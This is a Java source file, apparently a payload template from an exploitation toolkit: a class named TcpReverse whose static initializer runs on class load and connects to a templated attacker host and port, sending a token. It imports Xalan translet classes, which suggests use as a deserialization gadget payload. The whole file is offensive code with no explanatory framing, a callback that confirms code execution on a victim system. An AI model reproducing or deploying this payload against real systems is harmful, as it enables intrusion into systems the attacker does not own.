package payload;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;

public class TcpReverse{
    private static String host = "{{host}}";
    private static String port = "{{port}}";
    private static String token = "{{token}}";
    public static void start(){
        try {
            Socket socket = new Socket(host, Integer.valueOf(port));
            DataOutputStream out = new DataOutputStream(socket.getOutputStream());
            out.writeUTF(token);
            out.flush();
            socket.close();
            out.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    static {
            start();
    }
}
